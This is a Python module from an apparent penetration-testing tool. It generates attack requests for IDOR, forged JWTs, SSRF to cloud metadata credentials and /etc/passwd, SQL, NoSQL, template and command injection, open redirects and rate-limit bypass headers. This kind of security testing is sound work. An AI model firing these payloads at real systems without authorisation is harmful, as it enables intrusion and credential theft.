"""
PayloadTemplateEngine: Generates realistic, context-aware payloads for each vulnerability type.

Instead of sending generic GET requests, this engine produces crafted payloads based on
real-world techniques from security research papers and bug bounty writeups:
- IDOR: Sequential ID swap, UUID manipulation, negative IDs, encoded IDs
- JWT: alg:none, RS256→HS256 confusion, kid injection, expired token reuse
- SSRF: Cloud metadata, DNS rebinding, protocol smuggling, redirect chains
- Mass Assignment: Hidden field injection, role escalation, privilege fields
- Race Condition: Multi-threaded concurrent request templates
- GraphQL: Introspection, batching, deep nesting, field suggestion abuse
"""
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import json
import base64
import copy
import re
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.testing.payload_engine")


class PayloadTemplate:
    """A single payload with metadata about what it tests and expected outcomes."""
    def __init__(self, name: str, vuln_type: str, method: str, url: str,
                 headers: Dict[str, str] = None, body: Any = None,
                 json_data: Any = None, params: Dict[str, str] = None,
                 description: str = "", severity: str = "medium",
                 expected_indicator: str = "", tags: List[str] = None):
        self.name = name
        self.vuln_type = vuln_type
        self.method = method
        self.url = url
        self.headers = headers or {}
        self.body = body
        self.json_data = json_data
        self.params = params or {}
        self.description = description
        self.severity = severity
        self.expected_indicator = expected_indicator
        self.tags = tags or []

    def to_dict(self) -> Dict[str, Any]:
        return {
            "name": self.name, "vuln_type": self.vuln_type,
            "method": self.method, "url": self.url,
            "headers": self.headers, "body": self.body,
            "json_data": self.json_data, "params": self.params,
            "description": self.description, "severity": self.severity,
            "expected_indicator": self.expected_indicator, "tags": self.tags
        }


class PayloadTemplateEngine:
    """Generates attack payloads based on vulnerability type and target context."""
    def __init__(self, deep_mode: bool = False):
        self.deep_mode = deep_mode

    # ────────────────────────────────────────
    # IDOR / BOLA Payloads
    # ────────────────────────────────────────
    def generate_idor_payloads(self, base_url: str, param_name: str = "id",
                                original_value: str = "100") -> List[PayloadTemplate]:
        """Generate IDOR test payloads by manipulating object identifiers."""
        payloads: List[PayloadTemplate] = []
        parsed = urlparse(base_url)

        # 1. Sequential ID increment/decrement
        try:
            int_val = int(original_value)
            for offset in [-1, 1, 2, -99, 0]:
                new_val = str(int_val + offset)
                new_url = self._replace_param(base_url, param_name, new_val)
                payloads.append(PayloadTemplate(
                    name=f"IDOR_Sequential_{param_name}={new_val}",
                    vuln_type="idor", method="GET", url=new_url,
                    description=f"Sequential ID manipulation: {param_name}={original_value} → {new_val}",
                    severity="high",
                    expected_indicator="different_user_data_returned",
                    tags=["idor", "sequential"]
                ))
        except ValueError:
            pass

        # 2. UUID swap (if value looks like UUID)
        if len(original_value) >= 32 and "-" in original_value:
            # Flip last character
            mutated = original_value[:-1] + ("a" if original_value[-1] != "a" else "b")
            new_url = self._replace_param(base_url, param_name, mutated)
            payloads.append(PayloadTemplate(
                name=f"IDOR_UUID_Flip_{param_name}",
                vuln_type="idor", method="GET", url=new_url,
                description="UUID last-byte mutation to access adjacent object",
                severity="high", tags=["idor", "uuid"]
            ))

        # 3. Negative ID
        new_url = self._replace_param(base_url, param_name, "-1")
        payloads.append(PayloadTemplate(
            name=f"IDOR_Negative_{param_name}",
            vuln_type="idor", method="GET", url=new_url,
            description="Negative ID probe for error disclosure or admin fallback",
            severity="medium", tags=["idor", "negative_id"]
        ))

        # 4. Zero ID (often maps to admin/system user)
        new_url = self._replace_param(base_url, param_name, "0")
        payloads.append(PayloadTemplate(
            name=f"IDOR_Zero_{param_name}",
            vuln_type="idor", method="GET", url=new_url,
            description="Zero ID probe — often maps to system/admin user",
            severity="high", tags=["idor", "zero_id"]
        ))

        # 5. Array wrapping: id[]=100&id[]=101
        array_url = base_url.split("?")[0] + f"?{param_name}[]={original_value}&{param_name}[]=1"
        payloads.append(PayloadTemplate(
            name=f"IDOR_ArrayParam_{param_name}",
            vuln_type="idor", method="GET", url=array_url,
            description="Array parameter injection to access multiple objects",
            severity="high", tags=["idor", "array_param"]
        ))

        # 6. Path traversal ID: /api/users/100 → /api/users/101
        path_patterns = re.findall(r'/(\d+)(?:/|$)', parsed.path)
        if path_patterns:
            for p_val in path_patterns:
                try:
                    new_path = parsed.path.replace(f"/{p_val}", f"/{int(p_val) + 1}", 1)
                    new_url = urlunparse(parsed._replace(path=new_path))
                    payloads.append(PayloadTemplate(
                        name=f"IDOR_PathID_{p_val}→{int(p_val)+1}",
                        vuln_type="idor", method="GET", url=new_url,
                        description=f"Path-based ID swap: /{p_val} → /{int(p_val)+1}",
                        severity="high", tags=["idor", "path_id"]
                    ))
                except ValueError:
                    pass

        logger.info(f"[PayloadEngine] Generated {len(payloads)} IDOR payloads for {base_url}")
        return payloads

    # ────────────────────────────────────────
    # JWT / OAuth Payloads
    # ────────────────────────────────────────
    def generate_jwt_payloads(self, original_token: str = "") -> List[PayloadTemplate]:
        """Generate JWT manipulation payloads."""
        payloads: List[PayloadTemplate] = []

        # 1. alg:none attack
        header_none = base64.urlsafe_b64encode(json.dumps(
            {"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
        # Use a dummy payload
        payload_part = base64.urlsafe_b64encode(json.dumps(
            {"sub": "1", "admin": True, "iat": 9999999999}).encode()).decode().rstrip("=")
        none_token = f"{header_none}.{payload_part}."
        payloads.append(PayloadTemplate(
            name="JWT_AlgNone", vuln_type="jwt", method="GET", url="",
            headers={"Authorization": f"Bearer {none_token}"},
            description="Algorithm confusion: alg=none bypasses signature verification",
            severity="critical", tags=["jwt", "alg_none"]
        ))

        # 2. Empty signature
        if original_token and original_token.count(".") == 2:
            parts = original_token.split(".")
            empty_sig_token = f"{parts[0]}.{parts[1]}."
            payloads.append(PayloadTemplate(
                name="JWT_EmptySignature", vuln_type="jwt", method="GET", url="",
                headers={"Authorization": f"Bearer {empty_sig_token}"},
                description="Empty signature — server may skip verification",
                severity="critical", tags=["jwt", "empty_sig"]
            ))

        # 3. kid injection (SQL injection via kid header field)
        kid_header = base64.urlsafe_b64encode(json.dumps(
            {"alg": "HS256", "typ": "JWT",
             "kid": "' UNION SELECT 'secret' -- "}).encode()).decode().rstrip("=")
        kid_token = f"{kid_header}.{payload_part}.fake_signature"
        payloads.append(PayloadTemplate(
            name="JWT_KidSQLi", vuln_type="jwt", method="GET", url="",
            headers={"Authorization": f"Bearer {kid_token}"},
            description="kid header SQL injection to extract signing key",
            severity="critical", tags=["jwt", "kid_injection", "sqli"]
        ))

        # 4. RS256 → HS256 confusion
        rs_to_hs_header = base64.urlsafe_b64encode(json.dumps(
            {"alg": "HS256", "typ": "JWT"}).encode()).decode().rstrip("=")
        payloads.append(PayloadTemplate(
            name="JWT_RS256_to_HS256", vuln_type="jwt", method="GET", url="",
            headers={"Authorization": f"Bearer {rs_to_hs_header}.{payload_part}.tampered"},
            description="Algorithm confusion: RS256→HS256 uses public key as HMAC secret",
            severity="critical", tags=["jwt", "alg_confusion"]
        ))

        # 5. Expired token reuse
        exp_payload = base64.urlsafe_b64encode(json.dumps(
            {"sub": "1", "admin": False, "iat": 1000000000, "exp": 1000000001}).encode()
        ).decode().rstrip("=")
        exp_header = base64.urlsafe_b64encode(json.dumps(
            {"alg": "HS256", "typ": "JWT"}).encode()).decode().rstrip("=")
        payloads.append(PayloadTemplate(
            name="JWT_ExpiredReuse", vuln_type="jwt", method="GET", url="",
            headers={"Authorization": f"Bearer {exp_header}.{exp_payload}.old_sig"},
            description="Expired token reuse — tests if server validates exp claim",
            severity="high", tags=["jwt", "expired"]
        ))

        logger.info(f"[PayloadEngine] Generated {len(payloads)} JWT payloads")
        return payloads

    # ────────────────────────────────────────
    # SSRF Payloads
    # ────────────────────────────────────────
    def generate_ssrf_payloads(self, base_url: str, param_name: str = "url") -> List[PayloadTemplate]:
        """Generate SSRF test payloads targeting internal services and cloud metadata."""
        payloads: List[PayloadTemplate] = []

        ssrf_targets = [
            # AWS metadata
            ("SSRF_AWS_Metadata_v1", "http://169.254.169.254/latest/meta-data/", "critical",
             "AWS EC2 instance metadata (IMDSv1)"),
            ("SSRF_AWS_Metadata_v2", "http://169.254.169.254/latest/api/token", "critical",
             "AWS IMDSv2 token endpoint"),
            ("SSRF_AWS_Credentials", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "critical",
             "AWS IAM role credentials leak"),
            # GCP metadata
            ("SSRF_GCP_Metadata", "http://metadata.google.internal/computeMetadata/v1/", "critical",
             "GCP compute instance metadata"),
            # Azure metadata
            ("SSRF_Azure_Metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "critical",
             "Azure instance metadata"),
            # Internal services
            ("SSRF_Localhost", "http://127.0.0.1/", "high",
             "Localhost access — internal service probing"),
            ("SSRF_Localhost_Admin", "http://127.0.0.1:8080/admin", "high",
             "Internal admin panel via localhost"),
            ("SSRF_Internal_Elastic", "http://127.0.0.1:9200/_cat/indices", "high",
             "Internal Elasticsearch cluster enumeration"),
            ("SSRF_Internal_Redis", "http://127.0.0.1:6379/", "high",
             "Internal Redis instance probing"),
            # DNS rebinding & bypass
            ("SSRF_DNS_Hex", "http://0x7f000001/", "high",
             "Hex-encoded localhost bypass"),
            ("SSRF_DNS_Octal", "http://0177.0.0.1/", "high",
             "Octal-encoded localhost bypass"),
            ("SSRF_DNS_Decimal", "http://2130706433/", "medium",
             "Decimal IP bypass for localhost (2130706433 = 127.0.0.1)"),
            ("SSRF_IPv6_Loopback", "http://[::1]/", "high",
             "IPv6 loopback bypass"),
            ("SSRF_Short_URL_127", "http://127.1/", "medium",
             "Shortened localhost 127.1"),
            # Protocol smuggling
            ("SSRF_File_Proto", "file:///etc/passwd", "critical",
             "File protocol — local file read via SSRF"),
            ("SSRF_Gopher_Proto", "gopher://127.0.0.1:6379/_INFO", "critical",
             "Gopher protocol to interact with Redis"),
        ]

        for name, target_url, severity, desc in ssrf_targets:
            new_url = self._replace_param(base_url, param_name, target_url)
            payloads.append(PayloadTemplate(
                name=name, vuln_type="ssrf", method="GET", url=new_url,
                description=desc, severity=severity,
                tags=["ssrf", name.split("_")[1].lower()]
            ))

        logger.info(f"[PayloadEngine] Generated {len(payloads)} SSRF payloads for {base_url}")
        return payloads

    # ────────────────────────────────────────
    # Mass Assignment Payloads
    # ────────────────────────────────────────
    def generate_mass_assignment_payloads(self, base_url: str,
                                          known_params: List[str] = None) -> List[PayloadTemplate]:
        """Generate mass assignment payloads that inject hidden privileged fields."""
        payloads: List[PayloadTemplate] = []
        known_params = known_params or []

        # Privileged fields commonly vulnerable to mass assignment
        privilege_injections = [
            ({"role": "admin"}, "Role escalation to admin"),
            ({"isAdmin": True}, "Boolean admin flag injection"),
            ({"is_admin": True}, "Snake_case admin flag injection"),
            ({"user_type": "administrator"}, "User type escalation"),
            ({"permissions": ["admin", "write", "delete"]}, "Permission array injection"),
            ({"balance": 999999}, "Financial balance manipulation"),
            ({"credit": 999999}, "Credit amount tampering"),
            ({"price": 0}, "Price manipulation to zero"),
            ({"discount": 100}, "Discount percentage to 100%"),
            ({"verified": True}, "Account verification bypass"),
            ({"email_verified": True}, "Email verification bypass"),
            ({"status": "approved"}, "Status escalation to approved"),
            ({"subscription_plan": "enterprise"}, "Subscription plan escalation"),
            ({"rate_limit": 999999}, "Rate limit bypass via field injection"),
            ({"two_factor_enabled": False}, "2FA disable via mass assignment"),
        ]

        for inject_fields, desc in privilege_injections:
            # Merge known params with injected ones
            json_body = {p: "test_value" for p in known_params}
            json_body.update(inject_fields)

            payloads.append(PayloadTemplate(
                name=f"MassAssign_{list(inject_fields.keys())[0]}",
                vuln_type="mass_assignment", method="POST", url=base_url,
                json_data=json_body,
                headers={"Content-Type": "application/json"},
                description=desc,
                severity="high" if "admin" in str(inject_fields) else "medium",
                tags=["mass_assignment", "privilege_escalation"]
            ))

            # Also try PUT and PATCH (common update endpoints)
            for method in ["PUT", "PATCH"]:
                payloads.append(PayloadTemplate(
                    name=f"MassAssign_{method}_{list(inject_fields.keys())[0]}",
                    vuln_type="mass_assignment", method=method, url=base_url,
                    json_data=json_body,
                    headers={"Content-Type": "application/json"},
                    description=f"{desc} (via {method})",
                    severity="high" if "admin" in str(inject_fields) else "medium",
                    tags=["mass_assignment", method.lower()]
                ))

        logger.info(f"[PayloadEngine] Generated {len(payloads)} Mass Assignment payloads for {base_url}")
        return payloads

    # ────────────────────────────────────────
    # GraphQL Payloads
    # ────────────────────────────────────────
    def generate_graphql_payloads(self, graphql_url: str) -> List[PayloadTemplate]:
        """Generate GraphQL-specific attack payloads."""
        payloads: List[PayloadTemplate] = []

        # 1. Full introspection query
        introspection_query = {
            "query": "{ __schema { types { name fields { name type { name kind ofType { name } } } } } }"
        }
        payloads.append(PayloadTemplate(
            name="GraphQL_FullIntrospection", vuln_type="graphql",
            method="POST", url=graphql_url,
            json_data=introspection_query,
            headers={"Content-Type": "application/json"},
            description="Full schema introspection — exposes all types, fields, and mutations",
            severity="medium",
            expected_indicator="__schema",
            tags=["graphql", "introspection"]
        ))

        # 2. Depth-based DoS probe
        depth_query = {
            "query": "{ user { friends { friends { friends { friends { friends { name } } } } } } }"
        }
        payloads.append(PayloadTemplate(
            name="GraphQL_DepthDoS", vuln_type="graphql",
            method="POST", url=graphql_url,
            json_data=depth_query,
            headers={"Content-Type": "application/json"},
            description="Deeply nested query — tests for depth limiting",
            severity="medium", tags=["graphql", "dos"]
        ))

        # 3. Batch query attack
        batch_query = [
            {"query": "{ user(id: 1) { email } }"},
            {"query": "{ user(id: 2) { email } }"},
            {"query": "{ user(id: 3) { email } }"},
            {"query": "{ user(id: 4) { email } }"},
            {"query": "{ user(id: 5) { email } }"},
        ]
        payloads.append(PayloadTemplate(
            name="GraphQL_BatchIDOR", vuln_type="graphql",
            method="POST", url=graphql_url,
            json_data=batch_query,
            headers={"Content-Type": "application/json"},
            description="Batch query to enumerate user data (IDOR via GraphQL batching)",
            severity="high", tags=["graphql", "batch", "idor"]
        ))

        # 4. Field suggestion abuse (intentional typo)
        suggestion_query = {
            "query": "{ usre { emial } }"
        }
        payloads.append(PayloadTemplate(
            name="GraphQL_FieldSuggestion", vuln_type="graphql",
            method="POST", url=graphql_url,
            json_data=suggestion_query,
            headers={"Content-Type": "application/json"},
            description="Intentional typo to trigger field suggestion — leaks schema",
            severity="low",
            expected_indicator="Did you mean",
            tags=["graphql", "info_disclosure"]
        ))

        # 5. Mutation probe (common patterns)
        mutation_probes = [
            '{ __schema { mutationType { fields { name args { name type { name } } } } } }',
        ]
        for mq in mutation_probes:
            payloads.append(PayloadTemplate(
                name="GraphQL_MutationEnum", vuln_type="graphql",
                method="POST", url=graphql_url,
                json_data={"query": mq},
                headers={"Content-Type": "application/json"},
                description="Mutation enumeration via introspection",
                severity="medium", tags=["graphql", "mutation_enum"]
            ))

        logger.info(f"[PayloadEngine] Generated {len(payloads)} GraphQL payloads for {graphql_url}")
        return payloads

    # ────────────────────────────────────────
    # Race Condition Payloads
    # ────────────────────────────────────────
    def generate_race_condition_payloads(self, target_url: str, method: str = "POST",
                                          json_body: Dict = None,
                                          concurrency: int = 10) -> List[PayloadTemplate]:
        """Generate race condition burst payloads."""
        payloads: List[PayloadTemplate] = []
        json_body = json_body or {}

        payloads.append(PayloadTemplate(
            name=f"RaceCondition_Burst_{concurrency}x",
            vuln_type="race_condition", method=method, url=target_url,
            json_data=json_body,
            headers={"Content-Type": "application/json"},
            description=f"Concurrent burst of {concurrency} identical requests to exploit TOCTOU",
            severity="high",
            tags=["race_condition", f"concurrency_{concurrency}"]
        ))

        # Last-byte sync technique
        payloads.append(PayloadTemplate(
            name="RaceCondition_LastByteSync",
            vuln_type="race_condition", method=method, url=target_url,
            json_data=json_body,
            headers={"Content-Type": "application/json", "Transfer-Encoding": "chunked"},
            description="Last-byte synchronization technique for precise timing",
            severity="high",
            tags=["race_condition", "last_byte_sync"]
        ))

        logger.info(f"[PayloadEngine] Generated {len(payloads)} Race Condition payloads for {target_url}")
        return payloads

    # ────────────────────────────────────────
    # CORS Payloads
    # ────────────────────────────────────────
    def generate_cors_payloads(self, target_url: str) -> List[PayloadTemplate]:
        """Generate CORS misconfiguration test payloads."""
        payloads: List[PayloadTemplate] = []

        origins = [
            ("CORS_NullOrigin", "null", "Null origin reflection"),
            ("CORS_Wildcard", "*", "Wildcard origin with credentials"),
            ("CORS_Subdomain_Takeover", "https://evil.target.com", "Subdomain injection"),
            ("CORS_Prefix_Bypass", "https://target.com.evil.com", "Domain prefix bypass"),
            ("CORS_Suffix_Bypass", "https://eviltarget.com", "Domain suffix bypass"),
            ("CORS_HTTP_Downgrade", "http://target.com", "HTTPS→HTTP downgrade"),
        ]

        for name, origin, desc in origins:
            payloads.append(PayloadTemplate(
                name=name, vuln_type="cors", method="GET", url=target_url,
                headers={"Origin": origin},
                description=desc,
                severity="medium",
                expected_indicator="Access-Control-Allow-Origin",
                tags=["cors", "misconfiguration"]
            ))

        logger.info(f"[PayloadEngine] Generated {len(payloads)} CORS payloads for {target_url}")
        return payloads

    # ────────────────────────────────────────
    # NoSQL Injection Payloads
    # ────────────────────────────────────────
    def generate_nosql_payloads(self, base_url: str, param_name: str = "username") -> List[PayloadTemplate]:
        """Generate NoSQL operator injection and type confusion payloads."""
        payloads: List[PayloadTemplate] = []

        nosql_tests = [
            ("NoSQL_Op_NeNull", {"$ne": None}, "MongoDB $ne: null operator injection"),
            ("NoSQL_Op_GtEmpty", {"$gt": ""}, "MongoDB $gt: empty string operator injection"),
            ("NoSQL_Op_RegexAll", {"$regex": ".*"}, "MongoDB $regex: .* wildcard match"),
            ("NoSQL_Op_ExistsTrue", {"$exists": True}, "MongoDB $exists: true field existence test"),
            ("NoSQL_Op_InArray", {"$in": ["admin", "root", "user"]}, "MongoDB $in operator injection"),
        ]

        # 1. JSON body injection
        for name, op_dict, desc in nosql_tests:
            json_body = {param_name: op_dict}
            payloads.append(PayloadTemplate(
                name=name, vuln_type="nosql_injection", method="POST", url=base_url,
                headers={"Content-Type": "application/json"},
                json_data=json_body,
                description=desc, severity="critical",
                expected_indicator="auth_bypass_or_data_leak",
                tags=["nosql", "injection", "operator"]
            ))

        # 2. URL parameter operator tampering (e.g. user[$ne]=1)
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[f"{param_name}[$ne]"] = ["x"]
        new_query = urlencode({k: v[0] for k, v in params.items()})
        url_op = urlunparse(parsed._replace(query=new_query))
        payloads.append(PayloadTemplate(
            name=f"NoSQL_QueryOp_{param_name}[$ne]",
            vuln_type="nosql_injection", method="GET", url=url_op,
            description=f"Query string parameter operator injection {param_name}[$ne]=x",
            severity="critical", tags=["nosql", "query_injection"]
        ))

        logger.info(f"[PayloadEngine] Generated {len(payloads)} NoSQL payloads for {base_url}")
        return payloads

    # ────────────────────────────────────────
    # SQL Injection Payloads
    # ────────────────────────────────────────
    def generate_sqli_payloads(self, base_url: str, param_name: str = "id") -> List[PayloadTemplate]:
        """Generate SQL injection test payloads."""
        payloads: List[PayloadTemplate] = []

        sqli_tests = [
            ("SQLi_Boolean_True", "1' OR '1'='1", "Boolean-based SQLi true condition"),
            ("SQLi_Boolean_False", "1' AND '1'='2", "Boolean-based SQLi false condition"),
            ("SQLi_Union_Null", "1' UNION SELECT NULL-- -", "Generic UNION SELECT test"),
            ("SQLi_Error_Quote", "1'", "Single quote syntax error induction"),
            ("SQLi_Comment_Bypass", "1'-- -", "SQL comment truncation probe"),
            ("SQLi_Time_Sleep", "1' OR SLEEP(5)-- -", "Time-based blind probe"),
        ]

        for name, probe, desc in sqli_tests:
            new_url = self._replace_param(base_url, param_name, probe)
            payloads.append(PayloadTemplate(
                name=f"{name}_{param_name}",
                vuln_type="sql_injection", method="GET", url=new_url,
                description=desc, severity="critical",
                expected_indicator="sql_syntax_error_or_differential",
                tags=["sqli", "injection"]
            ))

        logger.info(f"[PayloadEngine] Generated {len(payloads)} SQLi payloads for {base_url}")
        return payloads

    # ────────────────────────────────────────
    # SSTI & RCE Payloads
    # ────────────────────────────────────────
    def generate_ssti_payloads(self, base_url: str, param_name: str = "template") -> List[PayloadTemplate]:
        """Generate Server-Side Template Injection (SSTI) polyglot payloads."""
        payloads: List[PayloadTemplate] = []

        ssti_tests = [
            ("SSTI_Jinja_Twig", "{{7*7}}", "Jinja2/Twig expression evaluation probe"),
            ("SSTI_Freemarker_EL", "${7*7}", "Freemarker / Spring EL expression probe"),
            ("SSTI_Smarty", "{7*7}", "Smarty template engine probe"),
            ("SSTI_ERB_Ruby", "<%= 7*7 %>", "Ruby ERB template evaluation probe"),
            ("SSTI_Polyglot_Complex", "{{7*'7'}}", "String multiplication probe (49 vs 7777777)"),
        ]

        for name, probe, desc in ssti_tests:
            new_url = self._replace_param(base_url, param_name, probe)
            payloads.append(PayloadTemplate(
                name=f"{name}_{param_name}",
                vuln_type="ssti_analysis", method="GET", url=new_url,
                description=desc, severity="critical",
                expected_indicator="49",
                tags=["ssti", "template_injection"]
            ))

        logger.info(f"[PayloadEngine] Generated {len(payloads)} SSTI payloads for {base_url}")
        return payloads

    def generate_rce_payloads(self, base_url: str, param_name: str = "cmd") -> List[PayloadTemplate]:
        """Generate OS Command Injection test payloads."""
        payloads: List[PayloadTemplate] = []

        rce_tests = [
            ("RCE_Pipe_Id", "| id", "Pipe separator command execution probe"),
            ("RCE_Semicolon_Id", "; id", "Semicolon separator command execution probe"),
            ("RCE_Substitution_Id", "$(id)", "Command substitution probe"),
            ("RCE_Backtick_Id", "`id`", "Backtick command execution probe"),
            ("RCE_And_Id", "&& id", "Boolean AND command execution probe"),
        ]

        for name, probe, desc in rce_tests:
            new_url = self._replace_param(base_url, param_name, probe)
            payloads.append(PayloadTemplate(
                name=f"{name}_{param_name}",
                vuln_type="command_injection", method="GET", url=new_url,
                description=desc, severity="critical",
                expected_indicator="uid=",
                tags=["rce", "command_injection"]
            ))

        logger.info(f"[PayloadEngine] Generated {len(payloads)} RCE payloads for {base_url}")
        return payloads

    # ────────────────────────────────────────
    # Rate Limit & Brute-Force Bypass Payloads
    # ────────────────────────────────────────
    def generate_rate_limit_bypass_headers(self, target_url: str, ip_index: int = 1) -> List[PayloadTemplate]:
        """Generate anti-automation / rate limit bypass header probes."""
        payloads: List[PayloadTemplate] = []

        spoofed_ips = [f"127.0.0.{ip_index}", f"10.0.0.{ip_index}", f"192.168.1.{ip_index}"]
        header_names = [
            "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
            "X-Remote-IP", "X-Client-IP", "True-Client-IP", "CF-Connecting-IP"
        ]

        for ip in spoofed_ips:
            for hname in header_names:
                payloads.append(PayloadTemplate(
                    name=f"RateLimitBypass_{hname}_{ip}",
                    vuln_type="rate_limit_bypass", method="GET", url=target_url,
                    headers={hname: ip},
                    description=f"IP spoofing via {hname}: {ip}",
                    severity="medium",
                    expected_indicator="200_OK_bypass",
                    tags=["rate_limit", "ip_spoofing"]
                ))

        logger.info(f"[PayloadEngine] Generated {len(payloads)} Rate Limit Bypass payloads for {target_url}")
        return payloads

    # ────────────────────────────────────────
    # Open Redirect & OAuth Callback Payloads
    # ────────────────────────────────────────
    def generate_open_redirect_payloads(self, base_url: str, param_name: str = "url") -> List[PayloadTemplate]:
        """Generate Open Redirect test vectors."""
        payloads: List[PayloadTemplate] = []

        redirect_tests = [
            ("Redirect_DoubleSlash", "//evil.com", "Double-slash protocol-relative redirect"),
            ("Redirect_TripleSlash", "///evil.com", "Triple-slash parser confusion"),
            ("Redirect_AuthorityAt", "https://trusted.com@evil.com", "Authority @ symbol spoofing"),
            ("Redirect_SubdomainPrefix", "https://trusted.com.evil.com", "Subdomain suffix spoofing"),
            ("Redirect_DoubleEncoded", "%252f%252fevil.com", "Double URL encoded slash bypass"),
            ("Redirect_NullByte", "https://evil.com%00.trusted.com", "Null byte termination bypass"),
        ]

        for name, probe, desc in redirect_tests:
            new_url = self._replace_param(base_url, param_name, probe)
            payloads.append(PayloadTemplate(
                name=f"{name}_{param_name}",
                vuln_type="open_redirect", method="GET", url=new_url,
                description=desc, severity="high",
                expected_indicator="Location: .*evil.com",
                tags=["open_redirect", "oauth"]
            ))

        logger.info(f"[PayloadEngine] Generated {len(payloads)} Open Redirect payloads for {base_url}")
        return payloads

    # ────────────────────────────────────────
    # Exposed Information & Debug Routes
    # ────────────────────────────────────────
    def generate_info_disclosure_probes(self, origin: str) -> List[PayloadTemplate]:
        """Generate probes for discovering exposed actuator/debug/swagger routes."""
        payloads: List[PayloadTemplate] = []
        base = origin.rstrip("/")

        debug_paths = [
            ("/actuator", "Spring Boot Actuator Discovery"),
            ("/actuator/env", "Spring Boot Actuator Environment Secrets"),
            ("/actuator/heapdump", "Spring Boot Actuator Heapdump RAM Secret Leak"),
            ("/actuator/configprops", "Spring Boot Config Properties Disclosure"),
            ("/actuator/loggers", "Spring Boot Logger Configuration"),
            ("/actuator/httptrace", "Spring Boot HTTP Trace Log"),
            ("/actuator/health", "Spring Boot Actuator Health Status"),
            ("/actuator/mappings", "Spring Boot Route Mappings"),
            ("/v2/api-docs", "Swagger 2.0 API Documentation"),
            ("/v3/api-docs", "OpenAPI 3.0 Documentation"),
            ("/swagger-ui.html", "Swagger UI Dashboard"),
            ("/openapi.json", "OpenAPI Specification JSON"),
            ("/.env", "Exposed Environment Configuration File"),
            ("/.env.local", "Exposed Local Environment Secrets"),
            ("/.git/HEAD", "Exposed Git Repository Metadata"),
            ("/.svn/entries", "Exposed SVN Subversion Metadata"),
            ("/_profiler/phpinfo", "Symfony Profiler PHP Info Leak"),
            ("/_debug", "Node.js Express Debug Route"),
            ("/db.sql", "Exposed SQL Database Dump"),
            ("/backup.zip", "Exposed Backup Archive"),
            ("/server-status", "Apache Server Status Page"),
        ]

        for path, desc in debug_paths:
            probe_url = f"{base}{path}"
            payloads.append(PayloadTemplate(
                name=f"InfoDisc_{path.replace('/', '_')}",
                vuln_type="info_disclosure", method="GET", url=probe_url,
                description=desc, severity="high",
                expected_indicator="actuator_or_swagger_json",
                tags=["info_disclosure", "debug_routes"]
            ))

        logger.info(f"[PayloadEngine] Generated {len(payloads)} Info Disclosure probes for {origin}")
        return payloads

    # ────────────────────────────────────────
    # Utility Methods
    # ────────────────────────────────────────
    def _replace_param(self, url: str, param_name: str, new_value: str) -> str:
        """Replace a query parameter value in a URL."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param_name] = [new_value]
        new_query = urlencode({k: v[0] for k, v in params.items()})
        return urlunparse(parsed._replace(query=new_query))

    def generate_all_for_endpoint(self, endpoint: Dict[str, Any]) -> List[PayloadTemplate]:
        """
        Generate all relevant payloads for a classified endpoint.
        Uses endpoint type, tags, and parameters to determine which generators to invoke.
        """
        url = endpoint.get("url", "")
        ep_type = endpoint.get("type", "")
        params = endpoint.get("parameters", [])
        tags = endpoint.get("tags", [])
        all_payloads: List[PayloadTemplate] = []

        if ep_type == "graphql" or "graphql" in tags:
            all_payloads.extend(self.generate_graphql_payloads(url))

        if "idor_candidate" in tags or ep_type in ("rest_api", "parameterized"):
            # Find the ID param
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            for pname, pvals in qs.items():
                if pname.lower() in {"id", "uid", "user_id", "userid", "account_id",
                                      "order_id", "doc_id", "item_id", "record_id", "ref"}:
                    all_payloads.extend(self.generate_idor_payloads(url, pname, pvals[0] if pvals else "1"))

        if "mass_assignment_candidate" in tags or ep_type == "form":
            all_payloads.extend(self.generate_mass_assignment_payloads(url, params))

        if ep_type in ("rest_api", "auth"):
            all_payloads.extend(self.generate_cors_payloads(url))

        # Check for SSRF / Redirect susceptible parameters
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        ssrf_params = {"url", "uri", "fetch", "proxy", "target", "link", "image", "feed"}
        redirect_params = {"redirect", "next", "return", "dest", "callback", "r", "goto", "out"}

        for pname in qs:
            plower = pname.lower()
            if plower in ssrf_params:
                all_payloads.extend(self.generate_ssrf_payloads(url, pname))
            if plower in redirect_params or "redirect_candidate" in tags:
                all_payloads.extend(self.generate_open_redirect_payloads(url, pname))
            if plower in {"search", "query", "q", "filter", "id", "name", "user"}:
                all_payloads.extend(self.generate_sqli_payloads(url, pname))
                all_payloads.extend(self.generate_nosql_payloads(url, pname))
            if plower in {"template", "name", "msg", "content", "render", "text"}:
                all_payloads.extend(self.generate_ssti_payloads(url, pname))
            if plower in {"cmd", "exec", "command", "file", "path", "ip", "host", "ping"}:
                all_payloads.extend(self.generate_rce_payloads(url, pname))

        logger.info(f"[PayloadEngine] Total {len(all_payloads)} payloads for endpoint {url}")
        return all_payloads

    def generate_tech_tailored_payloads(self, url: str, param_name: str, tech_hints: List[str]) -> List[PayloadTemplate]:
        """
        Generate technology-tailored payloads based on detected tech stack hints.
        Adapts SSTI, NoSQL, and SQLi mutations for Node.js, Spring/Java, PHP/Laravel, or Python/Flask.
        """
        payloads: List[PayloadTemplate] = []
        tech_str = " ".join(tech_hints).lower()

        # Node.js / Express
        if "node" in tech_str or "express" in tech_str or "react" in tech_str:
            payloads.append(PayloadTemplate(
                name="NodeJS_NoSQL_JSON_Obj", vuln_type="nosql_injection",
                method="POST", url=url, json_data={param_name: {"$gt": ""}},
                description="Node.js Express JSON body $gt NoSQL operator injection",
                severity="high"
            ))
            payloads.append(PayloadTemplate(
                name="NodeJS_Prototype_Pollution", vuln_type="mass_assignment",
                method="POST", url=url, json_data={"__proto__": {"admin": True}},
                description="Node.js global object prototype pollution probe",
                severity="critical"
            ))

        # Spring / Java
        if "java" in tech_str or "spring" in tech_str or "boot" in tech_str:
            payloads.append(PayloadTemplate(
                name="Spring_EL_SSTI", vuln_type="ssti_analysis",
                method="GET", url=self._replace_param(url, param_name, "${7*7}"),
                description="Spring Expression Language (SpEL) template evaluation payload",
                severity="critical"
            ))
